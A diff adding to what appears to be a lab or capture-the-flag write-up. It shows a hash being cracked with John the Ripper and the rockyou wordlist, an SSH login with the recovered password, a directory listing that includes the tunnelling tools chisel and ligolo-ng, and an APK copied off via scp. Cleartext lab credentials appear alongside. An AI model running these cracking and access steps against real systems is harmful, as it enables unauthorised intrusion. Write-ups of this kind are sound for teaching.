@@ -137,3 +137,36 @@ The SQLite users table held two cleartext application logins:
 
 svc-backup : BackupAgent2024
 admin      : SuperSecretAdm1n!
+
+Time to throw that hash into John and run it against rockyou.txt 
+john shadow.hash --wordlist=/usr/share/wordlists/rockyou.txt 
+Result: 
+dropsofjupiter   (svc-drop)
+SSH Password Found!
+
+Password has been cracked, one the password was entered I was able to login to ssh as svc-drop 
+ssh svc-drop@192.168.11.200
+
+Once I am here I start to search and see what files I can find 
+Results: 
+drwxr-x--- 6 svc-drop svc-drop     4096 Nov 10 12:38 .
+drwxr-xr-x 4 root     root         4096 May  9  2026 ..
+-rw------- 1 svc-drop svc-drop     4390 Nov 10 17:43 .bash_history
+-rw-r--r-- 1 svc-drop svc-drop      220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 svc-drop svc-drop     3771 Feb 25  2020 .bashrc
+drwx------ 2 svc-drop svc-drop     4096 Nov  9 20:33 .cache
+drwxrwxr-x 3 svc-drop svc-drop     4096 Nov  9 21:47 .local
+-rw-r--r-- 1 svc-drop svc-drop      807 Feb 25  2020 .profile
+-rw------- 1 svc-drop svc-drop       12 Nov 10 09:53 .python_history
+drwx------ 2 svc-drop svc-drop     4096 Nov 10 12:38 .ssh
+drwxr-xr-x 2 svc-drop svc-drop     4096 May  9  2026 backup
+-rwxrwxr-x 1 svc-drop svc-drop 11104416 Aug 29 13:28 chisel
+-rw-r--r-- 1 svc-drop svc-drop  6392031 Nov 10 12:38 deaddrop-mobile.apk
+-rwxrwxr-x 1 svc-drop svc-drop  7164088 Sep 26 08:04 ligolo-ng_agent_0.9.2_linux_amd64
+
+Perfect we have a apk file that I can download to the attack box and open 
+
+Grabbing the file via ssh 
+scp svc-drop@192.168.11.200:~/deaddrop-mobile.apk .
+
+
